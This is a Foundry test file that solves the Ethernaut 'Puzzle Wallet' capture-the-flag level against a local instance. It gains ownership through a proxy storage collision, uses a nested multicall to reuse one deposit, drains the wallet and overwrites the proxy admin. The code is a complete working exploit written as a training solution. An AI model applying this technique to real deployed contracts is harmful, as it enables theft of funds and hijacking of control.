// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/24-PuzzleWallet/PuzzleWallet.sol";
import "../src/24-PuzzleWallet/PuzzleWalletFactory.sol";

contract PuzzleWalletTest is Test {
    PuzzleWalletFactory factory;
    PuzzleWallet instance;
    address instanceAddress;
    address player = address(123456);

    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [
        abi.encodeWithSignature("deposit()"),
        abi.encodeWithSignature("multicall(bytes[])", depositData)
    ];

    function setUp() public {
        factory = new PuzzleWalletFactory();
        (, instanceAddress) = factory.createInstance{value: 1 ether}();
        instance = PuzzleWallet(payable(instanceAddress));
    }

    function testPuzzleWalletHack() public {
        startHoax(player);

        bool success;
        bytes memory data;

        (success, data) = instanceAddress.call(
            abi.encodeWithSelector(PuzzleProxy.proposeNewAdmin.selector, player)
        );
        assertEq(instance.owner(), player);

        instance.addToWhitelist(player);

        // data for multicall([deposit(), multical([deposit()])])
        // NOTE you must use multicallData as STORAGE here,
        // NOT MEMORY variable inside function becase STORAGE
        // will add extra bytes to you call data
        bytes memory fullCall = abi.encodeWithSelector(
            instance.multicall.selector,
            multicallData
        );
        emit log_named_bytes("full multicall data", fullCall);

        (success, data) = instanceAddress.call{value: 1 ether}(fullCall);

        assertEq(instanceAddress.balance, 2 ether);
        assertEq(instance.balances(player), 2 ether);

        instance.execute(player, 2 ether, bytes(""));
        assertEq(instanceAddress.balance, 0 ether);

        instance.setMaxBalance(uint256(uint160(player)));

        assertEq(PuzzleProxy(payable(instanceAddress)).admin(), player);
    }
}
